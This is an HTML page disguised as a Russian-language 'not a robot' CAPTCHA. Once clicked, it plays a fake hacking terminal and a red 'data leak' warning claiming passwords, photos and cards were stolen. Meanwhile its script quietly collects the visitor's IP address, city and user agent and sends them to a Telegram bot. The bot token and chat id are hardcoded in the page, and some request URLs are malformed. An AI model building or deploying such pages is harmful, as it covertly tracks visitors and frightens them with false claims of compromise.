<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; }
        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
        #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; }
        #leak-box { display: none; padding: 20px; }
        .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
        hr { border: 0; border-top: 2px solid red; margin: 15px 0; }
    </style>
</head>
<body>
    <div id="terminal"></div>

    <div id="captcha-box">
    
        <img src="https://www.gstatic.com" width="80">
        <h2>Подтвердите, что вы не робот</h2>
        <button class="btn-verify" onclick="startProcess()">Я не робот</button>
    </div>

    <div id="leak-box">
        <div class="danger-ui">
            <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
            <hr>
            <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">...</span></p>
            <p>> Город: <span id="user-geo" style="color:#fff;">...</span></p>
            <p>> Устройство: <span id="user-os" style="color:#fff;">...</span></p>
            <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ: Пароли, Фото, Карты</p>
        </div>
    </div>

    <script>
        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
        const chat_id = "-1003861311533";

        async function startProcess() {
            document.getElementById('captcha-box').style.display = 'none';
            const term = document.getElementById('terminal');
            term.style.display = 'block';

            const lines = [
                "> [INIT] Инициализация взлома...", "> [INFO] Поиск открытых портов...",
                "> [SUCCESS] Порт 8080 открыт", "> [INFO] Обход reCAPTCHA v2...",
                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...",
                "> [WARNING] Defender обнаружил активность", "> [SUCCESS] Defender отключен",
                "> [SYSTEM] Доступ к ядру системы...", "> [CRITICAL] Права ROOT получены",
                "> [INFO] Сканирование диска C:/...", "> [INFO] Чтение папки %APPDATA%...",
                "> [SUCCESS] База паролей извлечена", "> [INFO] Доступ к камере получен",
                "> [INFO] Синхронизация с сервером...", "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
            ];

            for (let line of lines) {
                let p = document.createElement('p');
                p.innerText = line;
                term.appendChild(p);
                window.scrollTo(0, document.body.scrollHeight);
                await new Promise(r => setTimeout(r, 250)); 
            }
 
            await getTripleData();
        }

                async function getTripleData() {
            let ip = "Не определен";
            let city = "Неизвестно";

            try {
                // 1. Получаем IPv4 (цифры)
                const ipRes = await fetch('https://api.ipify.org');
                const ipData = await ipRes.json();
                ip = ipData.ip;

                // 2. Тройной поиск города
                // Сначала пробуем самый стабильный сервис
                try {
                    const resA = await fetch(`https://freeipapi.com{ip}`);
                    const dA = await resA.json();
                    if (dA.cityName) {
                        city = `${dA.cityName}, ${dA.countryName}`;
                    }
                } catch(e) {}

                // Если первый не сработал, пробуем ipwho.is
                if (city === "Неизвестно") {
                    try {
                        const resB = await fetch(`https://ipwho.is{ip}`);
                        const dB = await resB.json();
                        if (dB.success) city = `${dB.city}, ${dB.country}`;
                    } catch(e) {}
                }

                // Вписываем данные в красное окно
                document.getElementById('user-ip').innerText = ip;
                document.getElementById('user-geo').innerText = city;
                document.getElementById('user-os').innerText = navigator.platform;

                // 3. Шлем лог в Телеграм
                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);

            } catch (e) {
                // Если всё упало - шлем уведомление об ошибке
                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка сбора данных: " + e.message)}`);
            }

            // Переключаем экран через полсекунды после отправки
            setTimeout(() => {
                document.getElementById('terminal').style.display = 'none';
                document.getElementById('leak-box').style.display = 'block';
            }, 500);
        }
    </script>
</body>
</html>
